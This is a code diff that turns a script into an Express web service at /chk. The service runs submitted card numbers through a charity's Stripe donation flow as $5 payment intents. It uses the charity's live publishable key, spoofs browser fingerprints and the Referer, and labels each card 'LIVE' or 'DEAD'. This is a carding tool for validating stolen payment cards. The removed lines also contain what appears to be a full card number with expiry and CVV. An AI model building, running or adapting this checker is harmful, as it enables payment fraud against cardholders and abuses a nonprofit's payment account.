@@ -1,67 +1,74 @@
+const express = require('express');
 const axios = require('axios');
+const app = express();
+const PORT = process.env.PORT || 10000;
 
-// Function to generate dynamic browser fingerprints
-const genFingerprint = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
+app.use(express.json());
+
+const ARTPAN_PK = 'pk_live_51QVIZEBQDKIMdEl0TH6zoYwCH8E5Q1XyxJ73HNSqz7kWQUDPelsHHplSQnRUDzQGkoC2PtEqKqhgT9pkltge0jaB00C63zAYQm';
+const ARTPAN_API = 'https://us-central1-artspanapp.cloudfunctions.net/createPaymentIntent';
+
+// IDs to mimic real browser fingerprints
+const genID = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
     const r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
     return v.toString(16);
 });
 
-const CONFIG = {
-    PK: 'pk_live_51QVIZEBQDKIMdEl0TH6zoYwCH8E5Q1XyxJ73HNSqz7kWQUDPelsHHplSQnRUDzQGkoC2PtEqKqhgT9pkltge0jaB00C63zAYQm',
-    CARD: { num: '4283322085859286', mon: '06', year: '2026', cvv: '097' }
-};
+app.get('/', (req, res) => res.send('ArtSpan Bypass API Active 🟢'));
 
-async function simulateHumanDonation() {
-    console.log("🧔 --- [MAN DONATING: STARTING FLOW] ---");
+app.get('/chk', async (req, res) => {
+    const { card } = req.query;
+    if (!card) return res.send('❌ Usage: /chk?card=num|mm|yyyy|cvv');
+
+    const [num, mon, year, cvv] = card.split('|').map(i => i.trim());
+    const fullYear = year.length === 2 ? `20${year}` : year;
 
     try {
-        // STEP 1: Get Secret (Initiating the donation form)
-        const intentRes = await axios.post('https://us-central1-artspanapp.cloudfunctions.net/createPaymentIntent', {
-            amount: 500, // $5.00 donation
+        // STEP 1: Get Secret (The Donation Form initialization)
+        const intentRes = await axios.post(ARTPAN_API, {
+            amount: 500, // $5.00 looks more like a real donation than $1.00
             email: `donor${Math.floor(Math.random()*1000)}@gmail.com`,
             live: true
         });
         const secret = intentRes.data.clientSecret;
-        console.log("✅ Donation Initiated");
+        const pi_id = secret.split('_secret')[0];
 
-        // STEP 2: Tokenization (The Bypass)
-        // We set headers to look like we are using a real browser on the ArtSpan site
+        // STEP 2: Create Payment Method (The "Surface" Bypass)
+        // We hit the payment_methods endpoint with authorized referers
         const pmRes = await axios.post('https://api.stripe.com/v1/payment_methods', 
             new URLSearchParams({
                 'type': 'card',
-                'card[number]': CONFIG.CARD.num,
-                'card[cvc]': CONFIG.CARD.cvv,
-                'card[exp_month]': CONFIG.CARD.mon,
-                'card[exp_year]': CONFIG.CARD.year,
-                'key': CONFIG.PK,
-                'guid': genFingerprint(),
-                'muid': genFingerprint(),
-                'sid': genFingerprint(),
+                'card[number]': num,
+                'card[cvc]': cvv,
+                'card[exp_month]': parseInt(mon),
+                'card[exp_year]': parseInt(fullYear),
+                'key': ARTPAN_PK,
+                'guid': genID(),
+                'muid': genID(),
+                'sid': genID(),
                 'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796'
             }).toString(),
             {
                 headers: {
                     'Origin': 'https://js.stripe.com',
-                    'Referer': 'https://www.artspan.org/', // Authorized domain
+                    'Referer': 'https://www.artspan.org/', 
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0'
                 }
             }
         ).catch(e => e.response);
 
         if (pmRes.data.error) {
-            console.log("❌ Surface Error:", pmRes.data.error.message);
-            return;
+            return res.send(`<h2>❌ Surface Error</h2><p>${pmRes.data.error.message}</p>`);
         }
 
         const pm_id = pmRes.data.id;
-        console.log("✅ Card Handshake Success:", pm_id);
 
-        // STEP 3: Final Confirmation
-        const confirmRes = await axios.post(`https://api.stripe.com/v1/payment_intents/${secret.split('_secret')[0]}/confirm`, 
+        // STEP 3: Confirm (The "Final Click")
+        const confirmRes = await axios.post(`https://api.stripe.com/v1/payment_intents/${pi_id}/confirm`, 
             new URLSearchParams({
                 'payment_method': pm_id,
                 'client_secret': secret,
-                'key': CONFIG.PK
+                'key': ARTPAN_PK
             }).toString(),
             {
                 headers: {
@@ -69,13 +76,23 @@ async function simulateHumanDonation() {
                     'Referer': 'https://www.artspan.org/'
                 }
             }
-        );
+        ).catch(e => e.response);
 
-        console.log("💰 DONATION RESULT:", confirmRes.data.status);
+        // Result Logic
+        const data = confirmRes.data;
+        const isLive = data.status === 'succeeded' || (data.error && data.error.decline_code === 'insufficient_funds');
+
+        res.send(`
+            <div style="font-family:sans-serif; text-align:center; margin-top:50px;">
+                <h1 style="color:${isLive ? 'green' : 'red'};">${isLive ? '✅ LIVE' : '❌ DEAD'}</h1>
+                <p><b>Msg:</b> ${data.error ? data.error.message : 'Success'}</p>
+                <p><b>Code:</b> ${data.error ? (data.error.decline_code || 'generic_decline') : 'success'}</p>
+            </div>
+        `);
 
     } catch (err) {
-        console.log("❌ Bank Response:", err.response ? err.response.data.error.message : err.message);
+        res.status(500).send(`Error: ${err.message}`);
     }
-}
+});
 
-simulateHumanDonation();
+app.listen(PORT, '0.0.0.0', () => console.log(`Server live on ${PORT}`));
